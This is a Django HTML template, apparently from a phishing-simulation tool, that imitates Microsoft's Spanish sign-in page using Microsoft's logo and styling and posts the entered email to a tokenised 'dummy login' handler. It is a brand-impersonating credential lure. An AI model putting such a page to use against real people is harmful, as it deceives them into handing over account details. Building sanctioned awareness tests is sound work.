<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en su cuenta</title>
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-image: url('https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4wH1V?ver=002c');
            background-size: cover;
            display: flex;
            justify_content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            background-color: #fff;
            width: 440px;
            height: auto;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            box-sizing: border-box;
        }

        .logo {
            margin-bottom: 24px;
        }

        .logo img {
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            margin-top: 0;
            color: #1b1b1b;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 36px;
            padding: 6px 10px;
            border: 1px solid #707070;
            /* Fallback */
            border-bottom-color: #0067b8;
            margin-bottom: 16px;
            box-sizing: border-box;
        }

        .btn-primary {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 8px 30px;
            float: right;
            cursor: pointer;
            font-size: 15px;
            min-width: 108px;
        }

        .btn-primary:hover {
            background-color: #005da6;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 13px;
        }

        .footer-links a {
            color: #0067b8;
            text-decoration: none;
            margin-right: 10px;
        }
    </style>
</head>

<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                alt="Microsoft">
        </div>
        <h1>Iniciar sesión</h1>
        <form action="{% url 'handle_dummy_login' token %}" method="post">
            {% csrf_token %}
            <input type="email" name="email" placeholder="Correo electrónico, teléfono o Skype" required>
            <p style="font-size: 13px; margin: 10px 0;">¿No tiene una cuenta? <a href="#"
                    style="color: #0067b8; text-decoration: none;">Cree una.</a></p>
            <div style="margin-top: 30px; overflow: hidden;">
                <button type="submit" class="btn-primary">Siguiente</button>
            </div>
        </form>
    </div>
</body>

</html>
